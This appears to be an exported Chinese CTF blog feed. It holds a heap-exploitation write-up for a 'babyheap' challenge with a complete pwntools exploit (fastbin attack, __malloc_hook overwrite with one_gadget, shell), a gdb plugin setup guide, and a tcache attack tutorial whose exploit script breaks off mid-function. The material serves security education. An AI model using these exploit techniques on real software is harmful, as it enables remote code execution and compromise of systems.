<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; rax@2</span><br><span class="line"></span><br><span class="line">  sub_B70();</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    v3 &#x3D; sub_138C();</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v3 &gt; 5 );</span><br><span class="line">  JUMPOUT(__CS__, dword_14F4 + dword_14F4[v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-2"><a href="#add函数如下：-2" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall add(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+10h] [bp-10h]@1</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [sp+14h] [bp-Ch]@3</span><br><span class="line">  void *v3; &#x2F;&#x2F; [sp+18h] [bp-8h]@6</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !*(24LL * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size: &quot;);</span><br><span class="line">      v2 &#x3D; sub_138C();</span><br><span class="line">      if ( v2 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v2 &gt; 4096 )</span><br><span class="line">          v2 &#x3D; 4096;</span><br><span class="line">        v3 &#x3D; calloc(v2, 1uLL);</span><br><span class="line">        if ( !v3 )</span><br><span class="line">          exit(-1);</span><br><span class="line">        *(24LL * i + a1) &#x3D; 1;</span><br><span class="line">        *(a1 + 24LL * i + 8) &#x3D; v2;</span><br><span class="line">        *(a1 + 24LL * i + 16) &#x3D; v3;</span><br><span class="line">        printf(&quot;Allocate Index %d\n&quot;, i);</span><br><span class="line">      &#125;</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 __fastcall edit(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; &#x2F;&#x2F; rax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@4</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( (result &amp; 0x80000000) &#x3D;&#x3D; 0LL &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Size: &quot;);</span><br><span class="line">      result &#x3D; sub_138C();</span><br><span class="line">      v3 &#x3D; result;</span><br><span class="line">      if ( result &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&quot;Content: &quot;);</span><br><span class="line">        result &#x3D; sub_11B2(*(24LL * v2 + a1 + 16), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下：-1"><a href="#show函数如下：-1" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">signed int __fastcall show(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int result; &#x2F;&#x2F; eax@1</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( result &gt;&#x3D; 0 &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Content: &quot;);</span><br><span class="line">      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));</span><br><span class="line">      result &#x3D; puts(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下：-1"><a href="#free函数如下：-1" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall free_(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; &#x2F;&#x2F; rax@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+1Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  result &#x3D; sub_138C();</span><br><span class="line">  v2 &#x3D; result;</span><br><span class="line">  if ( result &gt;&#x3D; 0 &amp;&amp; result &lt;&#x3D; 15 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; *(24LL * result + a1);</span><br><span class="line">    if ( result &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(24LL * v2 + a1) &#x3D; 0;</span><br><span class="line">      *(24LL * v2 + a1 + 8) &#x3D; 0LL;</span><br><span class="line">      free(*(24LL * v2 + a1 + 16));</span><br><span class="line">      result &#x3D; 24LL * v2 + a1;</span><br><span class="line">      *(result + 16) &#x3D; 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现在edit函数中，程序让我们输入size，指定输入长度，这样就造成了堆溢出。需要注意的是堆块是由 calloc 分配的，所以 chunk 中的内容全都为<code>\x00</code>。</p>
<h4 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>申请6个chunk，free掉1和2，利用0修改掉1的fd，使其指向0x80的chunk，然后连续malloc，这样就会拿到0x80的chunk地址了，这里要注意先修改0x80的chunk的size位，然后修改回size位，free掉0x80的chunk，然后利用show函数，泄露出<code>main_arena</code>地址</li>
<li>然后申请0x60的chunk，此时chunk2和刚申请回来的chunk的地址是一样的，我们再free掉，然后利用chunk2修改fd指针为<code>malloc_hook-0x23</code></li>
<li>然后连续malloc俩次，拿到<code>malloc_hook-0x23</code>为地址的fake_chunk，在malloc_hook处写入one_gadget，然后再一次malloc来getshell。</li>
</ol>
<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;babyheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyheap&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">	sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line">        sh.recvuntil(&#39;: &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(0x10) #0</span><br><span class="line">add(0x10) #1</span><br><span class="line">add(0x10) #2</span><br><span class="line">add(0x10) #3</span><br><span class="line">add(0x80) #4</span><br><span class="line">add(0x10) #5</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">edit(0,0x21,&#39;a&#39;*0x10+p64(0)+p64(0x21)+&#39;\x80&#39;) #1-&gt;4</span><br><span class="line">edit(3,0x20,&#39;a&#39;*0x10+p64(0)+p64(0x21))</span><br><span class="line">add(0x10) #1</span><br><span class="line">add(0x10) #2:-&gt;4</span><br><span class="line"></span><br><span class="line">edit(3,0x20,&#39;a&#39;*0x10+p64(0)+p64(0x91))</span><br><span class="line">free(4) </span><br><span class="line">show(2)</span><br><span class="line">sh.recvuntil(&#39;Content: \n&#39;)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x68</span><br><span class="line">#0x45216,0x4526a,0xf02a4,0xf1147</span><br><span class="line">one_gadget&#x3D;libc_base+0x4526a</span><br><span class="line">log.success(&#39;main_arena: &#39; +hex(main_arena))</span><br><span class="line">log.success(&#39;libc_base: &#39; +hex(libc_base))</span><br><span class="line">log.success(&#39;one_gadget: &#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">add(0x60) #4</span><br><span class="line">free(4)</span><br><span class="line">edit(2,0x8,p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))</span><br><span class="line"></span><br><span class="line">add(0x60) #4</span><br><span class="line">add(0x60) #5</span><br><span class="line">edit(6,0x1b,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line">      </span><br><span class="line">add(0x10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb.attach(sh) </span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<p>参考链接：</p>
<p><a href="http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/" target="_blank" rel="noopener external nofollow noreferrer">http://liul14n.top/2020/02/17/HOS-LCTF2016-pwn200/</a></p>
<p><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener external nofollow noreferrer">https://www.anquanke.com/post/id/85357</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>
<p><a href="http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#Roc826" target="_blank" rel="noopener external nofollow noreferrer">http://taqini.space/2020/02/12/2020-Hgame-pwn-writeup/#Roc826</a></p>
<p><a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-247214.htm</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>Fastbin Attack</tag>
        <tag>double free</tag>
        <tag>House Of Spirit</tag>
        <tag>Arbitrary Alloc</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb插件组合使用</title>
    <url>/2020/05/13/gdb%E6%8F%92%E4%BB%B6%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/h9JFzGoalIdEsAm.png" alt="alt"></p>
<a id="more"></a>

<h3 id="关于gdb插件peda-pwngdb-pwndbg的组合使用"><a href="#关于gdb插件peda-pwngdb-pwndbg的组合使用" class="headerlink" title="关于gdb插件peda,pwngdb,pwndbg的组合使用"></a>关于gdb插件peda,pwngdb,pwndbg的组合使用</h3><p>感谢NoOne师傅的指导，膜拜师傅</p>
<h4 id="安装peda插件"><a href="#安装peda插件" class="headerlink" title="安装peda插件"></a>安装peda插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;peda</span><br><span class="line">echo &quot;source ~&#x2F;peda&#x2F;peda.py&quot;&gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>

<h4 id="安装pwndbg插件"><a href="#安装pwndbg插件" class="headerlink" title="安装pwndbg插件"></a>安装pwndbg插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>

<h4 id="安装pwngdb插件"><a href="#安装pwngdb插件" class="headerlink" title="安装pwngdb插件"></a>安装pwngdb插件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git </span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>我这里的pwndbg，peda，Pwngdb都在同一级目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;pwndbg&#x2F;pwndbg&#x2F;</span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;pwndbg&#x2F;pwngdb.py .</span><br><span class="line">cd ~&#x2F;pwndbg&#x2F;pwndbg&#x2F;commands&#x2F;</span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;pwndbg&#x2F;commands&#x2F;pwngdb.py .</span><br></pre></td></tr></table></figure>

<p>再将.gdbinit文件配置成如下就好了, .gdbinit文件打开方式: vim ~/.gdbinit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~&#x2F;pwndbg&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;peda&#x2F;peda.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;angelheap&#x2F;gdbinit.py</span><br><span class="line">source ~&#x2F;Pwngdb&#x2F;pwngdb.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
        <category>gdb</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Tcache_bin_Attack</title>
    <url>/2020/09/25/tcache-bin-attack/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/Jsv4nGuyk3gi5OE.png" alt="alt"></p>
<a id="more"></a>

<h3 id="Tcache-bin"><a href="#Tcache-bin" class="headerlink" title="Tcache_bin"></a>Tcache_bin</h3><p>tcache是glibc2.26后新加入的一种缓存机制（在Ubuntu 18及之后的版本中应用），提升了不少性能，但是与此同时也大大牺牲了安全性，在ctf-wiki中介绍tcache的标题便是tcache makes heap exploitation easy again，与fastbin非常相似但优先级高于fastbin，且相对于fastbin来说少了很多检查，所以更加便于进行漏洞利用。</p>
<ol>
<li>tcache机制的主体是tcache_perthread_struct结构体，其中包含单链表tcache_entry</li>
<li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li>
<li>每一个单链表tcache Bin中默认允许存放的chunk块最大数量是<strong>7</strong></li>
<li>在申请chunk块时，如果<code>tcache Bin</code>中有符合要求的chunk，则直接返回；如果在fastbin中有符合要求的chunk，则先将对应fastbin中其他chunk加入相应的tcache Bin中，直到达到tcache Bin的数量上限，然后返回符合符合要求的chunk；如果在smallbin中有符合要求的chunk，则与fastbin相似，先将双链表中的其他剩余chunk加入到tcache中，再进行返回</li>
<li>在释放chunk块时，如果chunk size符合tcache Bin要求且相应的tcache Bin没有装满，则直接加入相应的tcache Bin</li>
<li>与fastbin相似，在tcache Bin中的chunk不会进行合并，因为它们的<code>pre_inuse</code>位会置成1</li>
</ol>
<h3 id="Tcache-bin-利用"><a href="#Tcache-bin-利用" class="headerlink" title="Tcache_bin 利用"></a>Tcache_bin 利用</h3><h4 id="Tcache-dup"><a href="#Tcache-dup" class="headerlink" title="Tcache dup"></a>Tcache dup</h4><p>与fastbin dup相似，它比fastbin dup更好利用，漏洞利用原因在于向tcache Bin中插入chunk的函数<code>tcache_put()</code>几乎没有检查：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们甚至无需在double free时插入一个无关chunk以绕过检查，可以直接对一个chunk进行多次释放操作。fastbin dup 是a-&gt;b-&gt;a,而tcache dup 直接a-&gt;a就可以利用。</p>
<p>这里我们做道题练习一下。</p>
<h3 id="LCTF2018-PWN-easy-heap-（例题在CTF-WIKI）"><a href="#LCTF2018-PWN-easy-heap-（例题在CTF-WIKI）" class="headerlink" title="LCTF2018 PWN easy_heap （例题在CTF WIKI）"></a>LCTF2018 PWN easy_heap （例题在CTF WIKI）</h3><h4 id="checksec-检查"><a href="#checksec-检查" class="headerlink" title="checksec 检查"></a>checksec 检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下："><a href="#main函数如下：" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; ST08_8@1</span><br><span class="line">  int v4; &#x2F;&#x2F; eax@4</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  sub_A3A();</span><br><span class="line">  qword_202050 &#x3D; (__int64)calloc(0xA0uLL, 1uLL);</span><br><span class="line">  if ( !qword_202050 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;init error!&quot;);</span><br><span class="line">    exit_(&quot;init error!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_B38();</span><br><span class="line">      v4 &#x3D; read_number();</span><br><span class="line">      if ( v4 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      free_(160LL, 1LL);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v4 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts_(160LL, 1LL);</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 &#x3D;&#x3D; 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        exit_(160LL);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &#x3D;&#x3D; 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rbx@7</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; [sp+0h] [bp-20h]@0</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+0h] [bp-20h]@10</span><br><span class="line">  int v4; &#x2F;&#x2F; [sp+4h] [bp-1Ch]@10</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; [sp+8h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  LODWORD(v2) &#x3D; 0;</span><br><span class="line">  while ( (signed int)v2 &lt;&#x3D; 9 &amp;&amp; *(_QWORD *)(16LL * (signed int)v2 + qword_202050) )</span><br><span class="line">    LODWORD(v2) &#x3D; v2 + 1;</span><br><span class="line">  if ( (_DWORD)v2 &#x3D;&#x3D; 10 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;full!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v0 &#x3D; qword_202050;</span><br><span class="line">    *(_QWORD *)(v0 + 16LL * (signed int)v2) &#x3D; malloc(0xF8uLL);</span><br><span class="line">    if ( !*(_QWORD *)(16LL * (signed int)v2 + qword_202050) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;malloc error!&quot;);</span><br><span class="line">      exit_(&quot;malloc error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;size \n&gt; &quot;, v2);</span><br><span class="line">    v4 &#x3D; read_number();</span><br><span class="line">    if ( (unsigned int)v4 &gt; 0xF8 )</span><br><span class="line">      exit_(&quot;size \n&gt; &quot;);</span><br><span class="line">    *(_DWORD *)(16LL * v3 + qword_202050 + 8) &#x3D; v4;</span><br><span class="line">    printf(&quot;content \n&gt; &quot;);</span><br><span class="line">    sub_BEC(*(_BYTE **)(16LL * v3 + qword_202050), *(_DWORD *)(16LL * v3 + qword_202050 + 8));</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="free函数如下："><a href="#free函数如下：" class="headerlink" title="free函数如下："></a>free函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall free_(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;index \n&gt; &quot;, a2);</span><br><span class="line">  v3 &#x3D; read_number();</span><br><span class="line">  if ( (unsigned int)v3 &gt; 9 || !*(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) )</span><br><span class="line">    exit_(&quot;index \n&gt; &quot;);</span><br><span class="line">  memset(*(void **)(16LL * (unsigned int)v3 + qword_202050), 0, *(_DWORD *)(16LL * (unsigned int)v3 + qword_202050 + 8));</span><br><span class="line">  free(*(void **)(16LL * (unsigned int)v3 + qword_202050));</span><br><span class="line">  *(_DWORD *)(16LL * (unsigned int)v3 + qword_202050 + 8) &#x3D; 0;</span><br><span class="line">  *(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) &#x3D; 0LL;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下："><a href="#show函数如下：" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  int v3; &#x2F;&#x2F; [sp+4h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  printf(&quot;index \n&gt; &quot;, a2);</span><br><span class="line">  v3 &#x3D; read_number();</span><br><span class="line">  if ( (unsigned int)v3 &gt; 9 || !*(_QWORD *)(16LL * (unsigned int)v3 + qword_202050) )</span><br><span class="line">    exit_(&quot;index \n&gt; &quot;);</span><br><span class="line">  puts(*(const char **)(16LL * (unsigned int)v3 + qword_202050));</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="sub-BEC函数如下："><a href="#sub-BEC函数如下：" class="headerlink" title="sub_BEC函数如下："></a>sub_BEC函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_BEC(_BYTE *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [sp+14h] [bp-Ch]@1</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; *MK_FP(__FS__, 40LL);</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( a2 - 1 &lt; v3 || !a1[v3] || a1[v3] &#x3D;&#x3D; 10 )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] &#x3D; 0; &#x2F;&#x2F;off by one</span><br><span class="line">    a1[a2] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>这道题麻烦点就在于没办法直接溢出覆盖prev_size，所以需要换一种方式来构造prev_size。程序的libc是2.27的，有tcache bin</p>
<ol>
<li>将 <code>A -&gt; B -&gt; C</code> 三块 unsorted bin chunk 依次进行释放</li>
<li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li>
<li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li>
<li>利用 unsorted bin 切分，分配出 A</li>
<li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li>
<li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li>
<li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： <code>A (free) -&gt; B (allocated) -&gt; C (free)</code>，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li>
<li>然后利用double free 来get shell</li>
</ol>
<p>但是在这个过程中需要注意 tcache 的影响。</p>
<h4 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easy_heap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easy_heap&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">	if len(content)&gt;&#x3D;size :</span><br><span class="line">        	sh.sendlineafter(&quot;&gt;&quot;, content[:-1])</span><br><span class="line">	else :</span><br><span class="line">		sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">		sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        